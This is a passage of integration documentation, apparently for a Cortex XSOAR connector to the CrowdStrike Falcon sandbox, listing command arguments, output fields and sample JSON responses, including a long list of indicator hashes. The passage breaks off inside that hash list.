#### Base Command

`cs-fx-find-submission-id`
#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| filter | Optional filter and sort criteria in the form of an FQL query. | Optional | 
| offset | The offset from which to start retrieving reports. | Optional | 
| limit | Maximum number of report IDs to return. Maximum is 5000. | Optional | 
| sort | Sort order. Possible values are: asc, desc. | Optional | 


#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| csfalconx.resource.resources | String | Set of report IDs that match the search criteria.  |


#### Command Example
```!cs-fx-find-submission-id offset=1 limit=5```

#### Context Example
```json
{
    "csfalconx": {
        "resource": {
            "resources": [
                "20879a8064904ecfbb62c118a6a19411_5d620c1322444253ad2be284de3756fa",
                "20879a8064904ecfbb62c118a6a19411_a35034fa31074e609d9f6b971b78e49c",
                "20879a8064904ecfbb62c118a6a19411_944bce16178742c58beccd0e6eb1a000",
                "20879a8064904ecfbb62c118a6a19411_70a75d10dbc74cfdaeeba2661bc96f05",
                "20879a8064904ecfbb62c118a6a19411_f6552785fd2d4219bbca4f2bcda8db0f"
            ]
        }
    }
}
```

#### Human Readable Output

>### CrowdStrike Falcon Intelligence Sandbox response:
>|resources|
>|---|
>| 20879a8064904ecfbb62c118a6a19411_5d620c1322444253ad2be284de3756fa |
>| 20879a8064904ecfbb62c118a6a19411_a35034fa31074e609d9f6b971b78e49c |
>| 20879a8064904ecfbb62c118a6a19411_944bce16178742c58beccd0e6eb1a000 |
>| 20879a8064904ecfbb62c118a6a19411_70a75d10dbc74cfdaeeba2661bc96f05 |
>| 20879a8064904ecfbb62c118a6a19411_f6552785fd2d4219bbca4f2bcda8db0f |


### file
***
Gets reputation info for one or more files, by their sha256 hash.


#### Base Command

`file`
#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| file | The file hash(es) to search for. | Required | 


#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| csfalconx.resource.id | Set | Set of report IDs that match the search criteria.  |
| csfalconx.resource.file_size | Number | The file size. | 
| csfalconx.resource.sha256 | String | SHA256 hash of the uploaded file. | 
| csfalconx.resource.threat_score | Number | Score of the threat. | 
| csfalconx.resource.verdict | String | Analysis verdict. | 
| DBotScore.Indicator | String | The indicator that was tested. | 
| DBotScore.Reliability | String | Reliability of the source providing the intelligence data. | 
| DBotScore.Score | Number | The actual score. | 
| DBotScore.Type | String | The indicator type. | 
| DBotScore.Vendor | String | The vendor used to calculate the score. | 
| File.Malicious.Description | Unknown | A description explaining why the file was determined to be malicious | 
| File.Malicious.Vendor | String | For malicious files, the vendor that made the decision. | 
| File.Name | String | The name of the file. | 
| File.SHA256 | String | The SHA256 hash of the file. | 
| File.Size | Number | The size of the file. | 
| File.Type | String | The type of the file. | 
| File.SHA1 | String | The SHA1 hash of the file. | 
| File.MD5 | String | The MD5 hash of the file. | 


#### Command Example
```!file d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee```

#### Context Example
```json
{
    "DBotScore": {
        "Indicator": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
        "Reliability": "B - Usually reliable",
        "Score": 3,
        "Type": "file",
        "Vendor": "CrowdStrike Falcon X"
    },
    "File": {
        "Malicious": {
            "Description": null,
            "Vendor": "CrowdStrike Falcon X"
        },
        "Name": "malware_test",
        "SHA256": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
        "Size": 177195,
        "Type": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Template: Normal.dotm, Revision Number: 1, Name of Creating Application: Microsoft Office Word, Create Time/Date: Wed Jul 22 23:12:00 2020, Last Saved Time/Date: Wed Jul 22 23:12:00 2020, Number of Pages: 1, Number of Words: 3, Number of Characters: 21, Security: 0"
    },
    "csfalconx": {
        "resource": {
            "file_size": 177195,
            "sha256": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
            "threat_score": 100,
            "verdict": "malicious"
        }
    }
}
```

#### Human Readable Output

>### CrowdStrike Falcon Intelligence Sandbox response:
>|file_size|sha256|threat_score|verdict|
>|---|---|---|---|
>| 177195 | d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee | 100 | malicious |


### cs-fx-submit-url
***
Submits a URL or FTP for sandbox analysis.

Notice: Submitting indicators using this command might make the indicator data publicly available. See the vendor’s documentation for more details.


#### Base Command

`cs-fx-submit-url`
#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| url | A web page or file URL. It can be HTTP(S) or FTP.<br/>For example: “https://url.com”,“ftp://ftp.com”. | Optional | 
| environment_id | Sandbox environment used for analysis. Possible values are: 310: Linux Ubuntu 20, 64-bit, 200: Android (static analysis), 160: Windows 10, 64-bit, 110: Windows 7, 64-bit, 100: Windows 7, 32-bit. | Optional | 
| action_script | Runtime script for sandbox analysis. Values:<br/>default<br/>default_maxantievasion<br/>default_randomfiles<br/>default_randomtheme<br/>default_openie. | Optional | 
| command_line | Command line script passed to the submitted file at runtime. Max length: 2048 characters. | Optional | 
| document_password | Auto-filled for Adobe or Office files that prompt for a password. Max length: 32 characters. | Optional | 
| enable_tor | Whether the sandbox analysis routes network traffic via TOR. Can be "true" or "false". If true, sandbox analysis routes network traffic via TOR. Default is false. Possible values are: false,  true. Default is false. | Optional | 
| submit_name | Name of the malware sample that’s used for file type detection and analysis. | Optional | 
| system_date | Sets a custom date for the sandbox environment in the format yyyy-MM-dd. | Optional | 
| polling | Whether to use Cortex XSOAR's built-in polling to retrieve the result when it's ready, Note - This command counts against the submission quota. Possible values are: true, false. | Optional | 
| interval_in_seconds | Interval in seconds between each poll. Default is 600. | Optional | 
| extended_data | If set to true, the report will return extended data which includes mitre attacks and signature information. Possible values are: true, false. Default is false. | Optional | 
| ids | This ia an internal argument used for the polling process, not to be used by the user. | Optional | 
| system_time | Sets a custom time for the sandbox environment in the format HH:mm. | Optional | 


#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| csfalconx.resource.submitted_id | String | Analysis ID received after submitting the file. | 
| csfalconx.resource.file_name | String | Analysis file_name. | 
| csfalconx.resource.tags | String | Analysis tags. | 
| csfalconx.resource.state | String | Analysis state. | 
| csfalconx.resource.created_timestamp | String | Analysis start time. | 
| csfalconx.resource.sha256 | Unknown | SHA256 hash of the scanned file. | 
| csfalconx.resource.environment_id | Unknown | Environment ID of the analysis. | 
| csfalconx.resource.sandbox.http_requests.header | String | The header of the http request. | 
| csfalconx.resource.sandbox.http_requests.Accept | String | The accept of the http request. | 
| csfalconx.resource.sandbox.http_requests.host_ip | String | The host ip of the http request. | 
| csfalconx.resource.sandbox.http_requests.host_port | Number | The host port of the http request. | 
| csfalconx.resource.sandbox.http_requests.method | String | The method of the http request. | 
| csfalconx.resource.sandbox.http_requests.url | String | The URL of the http request. | 
| csfalconx.resource.sandbox.User-Agent | String | The user agent of the http request. | 
| csfalconx.resource.sandbox.processes.command_line | String | The sandbox process command line. | 
| csfalconx.resource.sandbox.processes.handles.id | String | The sandbox handled ID. | 
| csfalconx.resource.sandbox.processes.handles.type | String | The sandbox handled type. | 
| csfalconx.resource.sandbox.processes.handles.path | String | The sandbox handled path. | 
| csfalconx.resource.sandbox.processes.name | String | The sandbox process name. | 
| csfalconx.resource.sandbox.processes.normalized_path | String | The sandbox process normalized path. | 
| csfalconx.resource.sandbox.processes.pid | Number | The sandbox process pid. | 
| csfalconx.resource.sandbox.processes.sha256 | String | The sandbox process sha256. | 
| csfalconx.resource.sandbox.architecture | String | The sandbox architecture. | 
| csfalconx.resource.sandbox.classification | String | The sandbox classification. | 
| csfalconx.resource.sandbox.classification_tags | String | The sandbox classification tags. | 
| csfalconx.resource.sandbox.extracted_files.name | String | The sandbox extracted file name. | 
| csfalconx.resource.sandbox.extracted_files.file_size | Number | The sandbox extracted file size. | 
| csfalconx.resource.sandbox.extracted_files.sha256 | String | The sandbox extracted file sha256. | 
| csfalconx.resource.sandbox.extracted_files.md5 | String | The sandbox extracted file md5. | 
| csfalconx.resource.sandbox.extracted_files.sha1 | String | The sandbox extracted file sha1. | 
| csfalconx.resource.sandbox.extracted_files.runtime_process | String | The sandbox extracted file runtime process. | 
| csfalconx.resource.sandbox.extracted_files.type_tags | String | The sandbox extracted file tags type. | 
| csfalconx.resource.sandbox.extracted_files.threat_level_readable | String | The sandbox extracted file threat level readable. | 
| csfalconx.resource.sandbox.extracted_files.description | String | The sandbox extracted file description. | 
| csfalconx.resource.sandbox.file_metadata.file_compositions | Unknown | The sandbox file metadata compositions. | 
| csfalconx.resource.sandbox.file_metadata.imported_objects | Unknown | The sandbox file metadata imported objects. | 
| csfalconx.resource.sandbox.file_metadata.file_analysis | Unknown | The sandbox file metadata analysis. | 
| csfalconx.resource.sandbox.file_size | Number | The sandbox file size. | 
| csfalconx.resource.sandbox.file_type | String | The sandbox file type. | 
| csfalconx.resource.sandbox.file_type_short | String | The sandbox file type short. | 
| csfalconx.resource.sandbox.packer | String | The sandbox packer. | 
| csfalconx.resource.sandbox.screenshots_artifact_ids | String | The sandbox screenshots artifact ids. | 
| csfalconx.resource.sandbox.dns_requests.address | String | The sandbox dns requests address. | 
| csfalconx.resource.sandbox.dns_requests.country | String | The sandbox dns requests country. | 
| csfalconx.resource.sandbox.dns_requests.domain | String | The sandbox dns requests domain. | 
| csfalconx.resource.sandbox.dns_requests.registrar_creation_timestamp | String | The sandbox dns requests registrar creation timestamp. | 
| csfalconx.resource.sandbox.dns_requests.registrar_name | String | The sandbox dns requests registrar name. | 
| csfalconx.resource.sandbox.dns_requests.registrar_organization | String | The sandbox dns requests registrar organization. | 
| csfalconx.resource.sandbox.contacted_hosts.address | String | The sandbox contacted hosts address. | 
| csfalconx.resource.sandbox.contacted_hosts.country | String | The sandbox contacted hosts country. | 
| csfalconx.resource.sandbox.contacted_hosts.port | Number | The sandbox contacted hosts port. | 
| csfalconx.resource.sandbox.contacted_hosts.protocol | String | The sandbox contacted hosts protocol. | 
| csfalconx.resource.sandbox.contacted_hosts.associated_runtime.name | String | The sandbox contacted hosts associated runtime name. | 
| csfalconx.resource.sandbox.contacted_hosts.associated_runtime.pid | String | The sandbox contacted hosts associated runtime pid. | 
| csfalconx.resource.sandbox.incidents | String | The sandbox incidents. | 
| csfalconx.resource.sandbox.mitre_attacks.tactic | String | The sndbox MITRE tactic name. | 
| csfalconx.resource.sandbox.mitre_attacks.technique | String | The sndbox MITRE technique name. | 
| csfalconx.resource.sandbox.mitre_attacks.attack_id | String | The sndbox MITRE technique ID. | 
| csfalconx.resource.sandbox.mitre_attacks.malicious_identifiers | String | The sndbox MITRE malicious identifiers. | 
| csfalconx.resource.sandbox.mitre_attacks.parent.technique | String | The sndbox MITRE parent technique name. | 
| csfalconx.resource.sandbox.mitre_attacks.parent.attack_id | String | The sndbox MITRE parent technique ID. | 
| csfalconx.resource.sandbox.mitre_attacks.parent.attack_id_wiki | String | The sndbox MITRE parent technique wiki URL link. | 
| csfalconx.resource.sandbox.signatures.threat_level_human | String | The sndbox signatures threat level. | 
| csfalconx.resource.sandbox.signatures.category | String | The sndbox signatures category. | 
| csfalconx.resource.sandbox.signatures.identifier | String | The sndbox signatures identifier. | 
| csfalconx.resource.sandbox.signatures.type | Number | The sndbox signatures type. | 
| csfalconx.resource.sandbox.signatures.relevance | Number | The sndbox signatures relevance. | 
| csfalconx.resource.sandbox.signatures.name | String | The sndbox signatures name. | 
| csfalconx.resource.sandbox.signatures.description | String | The sndbox signatures description. | 
| csfalconx.resource.sandbox.signatures.origin | String | The sndbox signatures origin. | 
| csfalconx.resource.intel.malware_families | Unknown | The malware families of the resource. | 
| csfalconx.resource.url_name | String | Submitted URL. | 


#### Command Example
```!cs-fx-submit-url url="https://www.google.com" environment_id="160: Windows 10" action_script="default" document_password="password" enable_tor="false" submit_name="malware_test" system_date="2020-08-10" system_time="12:48"```

#### Context Example
```json
{
    "csfalconx": {
        "resource": {
            "created_timestamp": "2020-07-03T06:36:19Z",
            "environment_id": 160,
            "state": "created",
            "submitted_id": "1c9fe398b2294301aa3080ede8d77356_472d590fdd4e49639e41f81928df2542",
            "url_name": "https://www.google.com"
        }
    }
}
```

#### Human Readable Output

>### CrowdStrike Falcon Intelligence Sandbox response:
>|created_timestamp|environment_id|state|submitted_id|url_name|
>|---|---|---|---|---|
>| 2020-07-03T06:36:19Z | 160 | created | 1c9fe398b2294301aa3080ede8d77356_472d590fdd4e49639e41f81928df2542 | https://www.google.com |


### cs-fx-download-ioc
***
Downloads IOC packs, PCAP files, and other analysis artifacts.


#### Base Command

`cs-fx-download-ioc`
#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| id | ID of an artifact, such as an IOC pack, PCAP file, or actor image. Find an artifact ID in a report or summary. | Required | 
| name | The name given to then downloaded file. | Optional | 
| accept_encoding | Format used to compress the downloaded file. Currently, you must provide the value of the GZIP file. Default is gzip. | Optional | 


#### Context Output

There is no context output for this command.

#### Command Example
```!cs-fx-download-ioc id="cd1db2f53e8760792a48a2ec544a29e6f876643204598621783f71017f6b4266" name="test" accept_encoding="gzip"```

#### Context Example
```json
{
    "csfalconx": {
        "resource": [
            [
                {
                    "ioc": "7.77.7.7",
                    "source": "runtime",
                    "type": "ip"
                },
                {
                    "ioc": "054e58bdec6972ff4b3167b34e77612f",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "05d6eeb048c90c766aece42e337dde4d",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "0f109e8d4aedbf943299263b152d4f00",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "15dd37df165655f35e8ce536d024167f",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "16e8057213bd80adc4baaf3a1ecc3f82",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "17fc5228ad1d52335c5fe981253ee545",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "195ef9caeb0f6216d9e8cfd4be942d36",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "1b4b2c7752a15752d30c0c0e6970988c",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "1c3582f2c953e92f1be73969f49b209e",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "1d5dc5cb90058cf92f1466d2fcfa4c97",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "21d10abfd2a3d671e5db3539c0cf431e",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "222d020bd33c90170a8296adc1b7036a",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "2291c23b5ff917a1e40a64c5e5d71986",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "262810da4b496d7ce1486a413e4b12b1",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "264d51f1b2f3df04bb8bf07f7b1fb71c",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "28082a61a32170d0479e2b1523962135",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "2d630301c6a51385326aab073ff4ec2e",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "32b14e28f95191808d638688c9152843",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "3623a0e7cdcf3310ffb4c87c5b43ae02",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "36353ce86b46b877af6d90325ff03b95",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "3663019e0506c85d753c08c02660b34a",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "394f5551ee04fb916f132a6ba807de11",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "3b48ed2a0c41e2329e9c7ab86edd64b1",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "3bbbb863f37d818aba19a8451927c616",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "3e52939e94c51551361a10ad81197b60",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "46266ab248b89b3a40542e63bfc02603",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "46eebcbe18910b967267d592f76a2836",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "4fe51249cdc1c1ab03173fd0bed7db4f",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "5695647c9de015395b00344eb9d48a9d",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "576af4ad78a176e07b1af29bcf92aa1e",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "59b1f27a96d13e54cd4867f0dddecd83",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "60767e9bd01835bd95792df61433ce4b",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "656da8a3661b746eb9374659d15c4a2b",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "67abaf7458772435ad67564b3fbf14a0",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "68b14871e4b235ac3788866621297a27",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "6d53703fddac024e2cf27fc4a7ac5df6",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "6f0cfccd7f00f7fd009b00ce6871272e",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "6fddc5aede1751f10ce62923c042a793",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "704730bc2fbc8c69a929e21ef8aa7379",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "72c6a76c1eec3490f06e41bfa0d3f26b",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "751b9ce3dc2dd9e3de156da983b2b3b4",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "77541eb350a5b881f81f3fcf6b9d3936",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "786551c4c8bcde890d0d4e0d70545529",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "7d3ed29c7c33ea81a14ab3563d3ce87c",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "7f15e8271ee067b6074493d93813dad3",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "80b82d4d5e9d867ff1113e1879d92f68",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "8295247d3dae9745677ec2c1d6339011",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "83018fe200707cc3205b49b59ad1f760",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "83129da20ca16fae0bf1e24820eb1906",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "878a59d39c6172aab0997124ece4e8fe",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "8c39aaffa9b99019fc96e298296543d3",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "8db811264a0a6282eb134f60c7844c57",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "8e5034c077d52dafd449df9206cf5471",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "9234edf95ad1d3409a38b90d16713467",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "93ba37530689e5f858dfa8b31ae6c236",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "951c29a740e714857433557e9de737c8",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "95351915b3f4e2d7f5c2a8744c0ce4eb",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "99ba01e7652e90cc1740d6eaef4effdf",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "9b305ac55cbefb495190ba4c3c6f8e97",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "9e284a4ffaad5f5c3a3b5d9f3ab0b03d",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "9ec17d371530d8a4ee2c90fd393a1eb4",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "9ef29221c01ff06c6808b4c61108a824",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "a040a3ada27bd0421afbe20ce933af4b",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "a5603a0780d44b6edfb18b7a68880b93",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "a66cc76dfcb0f4ed5c51bd9c1b389a78",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "a6763ae35acd41ec0f50bdfcc559d83b",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "a6836a433946a889741af4943e2ba623",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "a82bba1dcff205558edc62b4509775f6",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "a856d4a6170bbdc323372974ffca437e",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "a881defcf778f764141d5770e55132e4",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "a949ea32164cbfbeffaace03d289e34f",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "af84af2c2eaa9500b4a85e4237434b24",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "b080dc93850347a50475fcd3df3a263a",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "b3dfec2163622335b59b717d85a8b0d4",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "b447d3f9668152426c12a2c497346553",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "b4b02868b76e096f64bfc214f9611e8f",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "b4e3cf26877344bbf70852ac3f7a5b94",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "b5ff695b08c839155c5eb003d6e90cba",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "b8a434d31c6a7557e3a5723c39cc2ab3",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "c10d754c27174b47349306b4c3a3054f",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "ce72a3a3fe723345694654f97dad8bb6",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "d059dda2747521880e351cb19d66f25b",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "d1db526687b9439169ee91614fdd8e0c",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "d280e4b97c3981b9c85cda924a81ebac",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "d9129968f1e1cd135426368bbfaadb6b",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "d9472401f9b7002921cb909fa421393c",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "e03b08d438b560988883511e8d854a4b",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "e85a6a9cf37b580a47073a9f41f7e36e",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "eb815e917831e2d9475e148457799855",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "f2f95afad83bd1a8b4facf8debd6cf4c",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "f526b0de0664ec18965f46bcf39e6ab0",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "f8d1c5f572f3d8056d92e6a19f6a3186",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "fa0c8e71e7049ee4311b7c194ab9330b",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "fc47823102b667b6b7dc883155fbb574",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "fcab2d9f7bb7b3bee0fa8e47bcefdb95",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "fd3e826a891b2dba2acd7aea4e00599c",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "fdc1565e0b31d64d714aaf5234716bc2",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "fde52cb94e207ea2a2782dfa18d37ce3",
                    "source": "extracted",
                    "type": "md5"
                },
                {
                    "ioc": "0409018a0d4c8a5fca7a6872fc5f36c6c117eabf",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "09bfa1e0ed619838c09a8a2f9d0f305f51f35293",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "0a332783a3be35d35b4f8e6ed24c29b9b73fb2b2",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "0b2e71f7031c3ae1e426916a84592629e5285974",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "0bccfbe2680222ed00fc5b78472d68395f67c5d1",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "0cbd138a2ffada08365752c96dfb01e9c4706e72",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "0f142aec235f5b7055a51671fc8dd11c41761e89",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "0f9f02b33e97a37a0a83198d9277c7de30a2a133",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "12adc4a068cae4dd09372d30ba5b472b9a6f9187",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "135ad157d42af083da9c48f1b3a97e44043c46b0",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "194a177ff869dcc601a1c20e87e8a0743591964a",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "1acc8207029efcfc2abeeaf2d87732041ce43af0",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "1cbb4004815ad74e82bd38a25a842a5d8a11e2b6",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "1dac6ad3f332fbadde42f043aea0bfe38f8f7462",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "1df02e555b0eb8720a0e8f3a6236e96edbd46a44",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "20f8bbae09d11d0815e29b8c34d05fbf94025665",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "21bb1242cad0f4ed15f5428dd2888b0927bbbcbe",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "21ee83eb497f555d141c0a5da6cf0f4ed15b1bad",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "23d45a52d72f7d6ce5dd6870f6db2c6cbbf24a95",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "2494479325f5d95b0282c5804f29a1a2d3f279bc",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "258de626af33f204eb4f88a10035bffc185269cd",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "25e45a471f0ffb063302539f1c8199890b38b5bd",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "291fad57d3dde5490dbadddd8ea0a21b5b22b0e3",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "2b2003a078355d1b5c40a7173d902975adb82161",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "2e2a6d9ed39c0cd66e78016f32bcc4791f17a68e",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "2f947dd46ff651e9a0d7f459eb6d8e762f828f35",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "31ab45ed24d82fa29928e621a50916d40ebf90b9",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "344955ef0750adab73dcb1f990e034a1768dff33",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "355c210e196f7eee39bdca034313e20f7c8ffd6f",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "360dec6792e5cfe2bc7839a3663ede38d04c4f29",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "40696cc382192e83346030175c22d3ee8262ca40",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "440d2777660ebf84a0f51b0e9d4d70b38e7baa0c",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "47571575dfeaa7a547dd37bca16d09189e79b4ca",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "47de58c724df0b49b2b0d3d1e9641cca121d9f5f",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "51b28ec7ce79ea6d744d762d17df66e55d54c580",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "526a85d9e22f5e46631e96a22361424936ce1226",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "5906da6d0e07c4110e990ff9ff93004340ab8124",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "5b0f2ae72eed1584bc91176a04206f69ade904aa",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "5b8df645cff49aa1390d76af30571412987b004b",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
                    "ioc": "5e890811ecb79be566670c281bbab2886f49c496",
                    "source": "extracted",
                    "type": "sha1"
                },
                {
